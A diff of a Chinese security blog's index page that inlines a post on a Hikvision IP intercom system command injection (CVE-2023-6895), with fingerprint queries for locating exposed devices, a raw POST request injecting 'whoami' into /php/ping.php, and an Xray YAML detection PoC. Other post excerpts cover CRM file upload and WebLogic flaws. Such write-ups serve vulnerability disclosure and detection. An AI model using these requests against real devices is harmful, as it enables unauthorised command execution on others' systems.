@@ -1,761 +1,1059 @@
-
-
 <!DOCTYPE html>
-<html lang="zh-CN" data-default-color-scheme=auto>
-
-
-
+<html lang="zh-CN">
 <head>
   <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/fco.jpg">
-  <link rel="icon" href="/img/fco.jpg">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="theme-color" content="#2f4154">
-  <meta name="author" content="m0ch4z">
-  <meta name="keywords" content="">
-  
-    <meta property="og:type" content="website">
-<meta property="og:title" content="m0ch4z&#39;blog">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"suiyideali.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Geek小黑板">
 <meta property="og:url" content="https://suiyideali.github.io/index.html">
-<meta property="og:site_name" content="m0ch4z&#39;blog">
+<meta property="og:site_name" content="Geek小黑板">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:author" content="m0ch4z">
-<meta name="twitter:card" content="summary_large_image">
-  
-  
-  
-  <title>m0ch4z&#39;blog</title>
+<meta name="twitter:card" content="summary">
 
-  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+<link rel="canonical" href="https://suiyideali.github.io/">
 
 
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : true,
+    isPost : false,
+    lang   : 'zh-CN'
+  };
+</script>
 
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-<!-- Do not modify the link that theme dependent icons -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
-  
-    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  <title>Geek小黑板</title>
   
 
 
 
 
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"suiyideali.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"b4f763bdabe2c39a3ce1baaa04190ab5","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"6Tp7ZllCJ1Q5Hr5Qx7QEnZoQ-MdYXbMMI","app_key":"hbnuiPd47pTbO5y5VU7X4yj7","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
-
-    if (CONFIG.web_analytics.follow_dnt) {
-      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
-      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
-    }
-  </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
-  
-
-  
-    <!-- Baidu Analytics -->
-    <script async>
-      if (!Fluid.ctx.dnt) {
-        var _hmt = _hmt || [];
-        (function() {
-          var hm = document.createElement("script");
-          hm.src = "https://hm.baidu.com/hm.js?b4f763bdabe2c39a3ce1baaa04190ab5";
-          var s = document.getElementsByTagName("script")[0];
-          s.parentNode.insertBefore(hm, s);
-        })();
-      }
-    </script>
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-    
-  
 
 
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
 
-  
-<meta name="generator" content="Hexo 6.3.0"></head>
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
 
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
 
-<body>
-  
+</head>
 
-  <header>
-    
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
 
-<div class="header-inner" style="height: 100vh;">
-  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/">
-      <strong>m0ch4z&#39;blog</strong>
-    </a>
-
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/">
-                <i class="iconfont icon-home-fill"></i>
-                <span>首页</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                <span>归档</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/">
-                <i class="iconfont icon-category-fill"></i>
-                <span>分类</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/">
-                <i class="iconfont icon-tags-fill"></i>
-                <span>标签</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/">
-                <i class="iconfont icon-user-fill"></i>
-                <span>关于我</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/links/">
-                <i class="iconfont icon-link-fill"></i>
-                <span>友链</span>
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
-              <i class="iconfont icon-search"></i>
-            </a>
-          </li>
-          
-        
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
-              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
-            </a>
-          </li>
-        
-      </ul>
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
     </div>
   </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Geek小黑板</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
 </nav>
 
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/suiyideali" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content index posts-expand">
+            
+      
   
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://suiyideali.github.io/2023/12/22/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86IP%E7%BD%91%E7%BB%9C%E5%AF%B9%E8%AE%B2%E5%B9%BF%E6%92%AD%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
 
-<div id="banner" class="banner" parallax=true
-     style="background: url('/img/bg/Background.jpg') no-repeat center center; background-size: cover;">
-  <div class="full-bg-img">
-    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-      <div class="banner-text text-center fade-in-up">
-        <div class="h2">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="m0ch4z">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Geek小黑板">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
           
-            <span id="subtitle" data-typed-text="Life is endless, tossing is endless"></span>
+            <a href="/2023/12/22/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86IP%E7%BD%91%E7%BB%9C%E5%AF%B9%E8%AE%B2%E5%B9%BF%E6%92%AD%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">海康威视IP网络对讲广播系统命令执行漏洞</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-12-22 14:14:43 / 修改时间：14:19:22" itemprop="dateCreated datePublished" datetime="2023-12-22T14:14:43+08:00">2023-12-22</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/POC/" itemprop="url" rel="index"><span itemprop="name">POC</span></a>
+                </span>
+            </span>
+
           
+
         </div>
+      </header>
 
-        
-      </div>
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-        <div class="scroll-down-bar">
-          <i class="iconfont icon-arrowdown"></i>
-        </div>
+          <h2 id="影响产品"><a href="#影响产品" class="headerlink" title="影响产品"></a>影响产品</h2><p>Hikvision Intercom Broadcasting System是中国海康威视（Hikvision）公司的一个对讲广播系统。</p>
+<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>海康威视IP网络对讲广播系统3.0.3_20201113_RELEASE（HIK）中发现了漏洞。它被宣布为危急状态。此漏洞影响文件&#x2F;php&#x2F;ping. php的未知代码。使用输入netstat -ano操作参数jsondata[ip]会导致os命令注入。升级到4.1.0版本可以解决这个问题。建议升级受影响的组件。</p>
+<h2 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h2><p>FoFa</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icon_hash=<span class="string">&quot;-1830859634&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>Zoomeye</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iconhash: <span class="string">&quot;e854b2eaa9e4685a95d8052d5e3165bc&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>Hunter</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">web.title==<span class="string">&quot;IP Intercom &amp; PA System&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>Quake</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">favicon: <span class="string">&quot;e854b2eaa9e4685a95d8052d5e3165bc&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202312221415460.png" alt="image.png"></p>
+<h3 id="POC包"><a href="#POC包" class="headerlink" title="POC包"></a>POC包</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /php/ping.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">83.0</span><span class="number">.4103</span><span class="number">.116</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Content-Length: 0</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">jsondata%5Btype%5D=99&amp;jsondata%5Bip%5D=whoami</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202312221415572.png" alt="image.png"></p>
+<h2 id="Xray-poc"><a href="#Xray-poc" class="headerlink" title="Xray-poc"></a>Xray-poc</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">poc-yaml-hikvision-intercom-broadcasting-system-rce</span></span><br><span class="line"><span class="attr">transport:</span> <span class="string">http</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line">  <span class="attr">windows:</span></span><br><span class="line">    <span class="attr">request:</span></span><br><span class="line">      <span class="attr">cache:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">method:</span> <span class="string">POST</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/php/ping.php</span></span><br><span class="line">      <span class="attr">headers:</span></span><br><span class="line">        <span class="attr">Content-Type:</span> <span class="string">application/x-www-form-urlencoded</span></span><br><span class="line">      <span class="attr">body:</span> <span class="string">|</span></span><br><span class="line"><span class="string">        jsondata[type]=99&amp;jsondata[ip]=whoami</span></span><br><span class="line"><span class="string"></span>      <span class="attr">follow_redirects:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">expression:</span> <span class="string">response.status</span> <span class="string">==</span> <span class="number">200</span> <span class="string">&amp;&amp;</span> <span class="string">response.body_string.contains(&quot;administrator&quot;)</span></span><br><span class="line">  <span class="attr">linux:</span></span><br><span class="line">    <span class="attr">request:</span></span><br><span class="line">      <span class="attr">cache:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">method:</span> <span class="string">POST</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/php/ping.php</span></span><br><span class="line">      <span class="attr">headers:</span></span><br><span class="line">        <span class="attr">Content-Type:</span> <span class="string">application/x-www-form-urlencoded</span></span><br><span class="line">      <span class="attr">body:</span> <span class="string">|</span></span><br><span class="line"><span class="string">        jsondata[type]=99&amp;jsondata[ip]=whoami</span></span><br><span class="line"><span class="string"></span>      <span class="attr">follow_redirects:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">expression:</span> <span class="string">response.status</span> <span class="string">==</span> <span class="number">200</span> <span class="string">&amp;&amp;</span> <span class="string">response.body_string.contains(&quot;root&quot;)</span></span><br><span class="line"><span class="attr">expression:</span> <span class="string">windows()</span> <span class="string">||</span> <span class="string">linux()</span></span><br><span class="line"><span class="attr">detail:</span></span><br><span class="line">  <span class="attr">author:</span> <span class="string">m0ch4z(https://cyberzone.cloud)</span></span><br><span class="line">  <span class="attr">links:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">https://cve.mitre.org/cgi-bin/cvename.cgi?name=2023-6895</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">https://stack.chaitin.com/vuldb/detail/cb7d954e-8e66-4527-9f5a-bdc5f2403253</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202312221418491.png" alt="xpoc探测效果"></p>
+
       
     </div>
-  </div>
-</div>
 
-</div>
-
-  </header>
-
-  <main>
-    
-      <div class="container nopadding-x-md">
-        <div id="board"
-          style="margin-top: 0">
-          
-          <div class="container">
-            <div class="row">
-              <div class="col-12 col-md-10 m-auto">
-                
-
-
-  <div class="row mx-auto index-card">
     
     
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2023/12/22/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86IP%E7%BD%91%E7%BB%9C%E5%AF%B9%E8%AE%B2%E5%B9%BF%E6%92%AD%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" target="_self">
-          海康威视IP网络对讲广播系统命令执行漏洞
-        </a>
-      </h1>
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
 
       
-      <a class="index-excerpt index-excerpt__noimg" href="/2023/12/22/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86IP%E7%BD%91%E7%BB%9C%E5%AF%B9%E8%AE%B2%E5%B9%BF%E6%92%AD%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" target="_self">
-        <div>
-          影响产品Hikvision Intercom Broadcasting System是中国海康威视（Hikvision）公司的一个对讲广播系统。 漏洞简介海康威视IP网络对讲广播系统3.0.3_20201113_RELEASE（HIK）中发现了漏洞。它被宣布为危急状态。此漏洞影响文件&#x2F;php&#x2F;ping. php的未知代码。使用输入netstat -ano操作参数jsondata
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2023-12-22 14:14" pubdate>
-              2023-12-22
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3 d-flex align-items-center">
-            <i class="iconfont icon-category"></i>
-            
-
-<span class="category-chains">
   
   
-    
-      <span class="category-chain">
-        
-  <a href="/categories/POC/" class="category-chain-item">POC</a>
-  
-  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://suiyideali.github.io/2023/12/14/%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9CRM%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
 
-      </span>
-    
-  
-</span>
-
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/Hikvision/">#Hikvision</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2023/12/14/%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9CRM%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" target="_self">
-          浙大恩特CRM前台任意文件上传漏洞
-        </a>
-      </h1>
-
-      
-      <a class="index-excerpt index-excerpt__noimg" href="/2023/12/14/%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9CRM%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" target="_self">
-        <div>
-          简介浙大恩特CRM是由浙江大学恩智浙大科技有限公司推出的客户关系管理（CRM）系统。该系统旨在帮助企业高效管理客户关系，提升销售业绩，促进市场营销和客户服务的优化。系统支持客户数据分析和报表展示，帮助企业深度挖掘客户数据，提供决策参考。 指纹FOFA:product&#x3D;”EnterCRM” QUAKE：EnterCRM AND title: “欢迎使用浙大恩特客户资源管理系统” 复现过程
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2023-12-14 10:25" pubdate>
-              2023-12-14
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3 d-flex align-items-center">
-            <i class="iconfont icon-category"></i>
-            
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/POC/" class="category-chain-item">POC</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/CMS/">#CMS</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2023/12/10/Weblogic%20LDAP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2021-2109)/" target="_self">
-          Weblogic LDAP 远程代码执行漏洞（CVE-2021-2109)
-        </a>
-      </h1>
-
-      
-      <a class="index-excerpt index-excerpt__noimg" href="/2023/12/10/Weblogic%20LDAP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2021-2109)/" target="_self">
-        <div>
-          漏洞影响WebLogic Server 10.3.6.0.0WebLogic Server 12.1.3.0.0WebLogic Server 12.2.1.3.0WebLogic Server 12.2.1.4.0WebLogic Server 14.1.1.0.0 漏洞复现访问一下URL http://xxx.xxx.xxx.xxx:7001如果有此页面未授权可访问，且在影响范围内则可能出现漏
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2023-12-10 23:13" pubdate>
-              2023-12-10
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3 d-flex align-items-center">
-            <i class="iconfont icon-category"></i>
-            
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/web%E5%AE%89%E5%85%A8/" class="category-chain-item">web安全</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/Weblogic/">#Weblogic</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2023/11/29/%E4%B8%BA%E4%BD%A0%E7%9A%84xray%E9%83%A8%E7%BD%B2%E5%8F%8D%E8%BF%9E%E5%B9%B3%E5%8F%B0/" target="_self">
-          为你的xray部署反连平台
-        </a>
-      </h1>
-
-      
-      <a class="index-excerpt index-excerpt__noimg" href="/2023/11/29/%E4%B8%BA%E4%BD%A0%E7%9A%84xray%E9%83%A8%E7%BD%B2%E5%8F%8D%E8%BF%9E%E5%B9%B3%E5%8F%B0/" target="_self">
-        <div>
-          反连平台的作用在平日的漏洞挖掘或者攻防对抗中，遇到诸如log4j rce、fastjson、ssrf、命令执行等没有回显的时候，这个时候dnslog平台这种反连平台就起到了作用，通过让目标执行ping、curl等命令，对反连平台发起请求，反连平台在接受到请求后，就能告诉我们，命令触发了，也就代表了漏洞存在了。 Xray也内置了反连平台，此篇博文记录博主部署Xray反连的过程以及踩坑点。大致流程参照
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2023-11-29 12:17" pubdate>
-              2023-11-29
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3 d-flex align-items-center">
-            <i class="iconfont icon-category"></i>
-            
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/" class="category-chain-item">安全工具</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/Xray/">#Xray</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
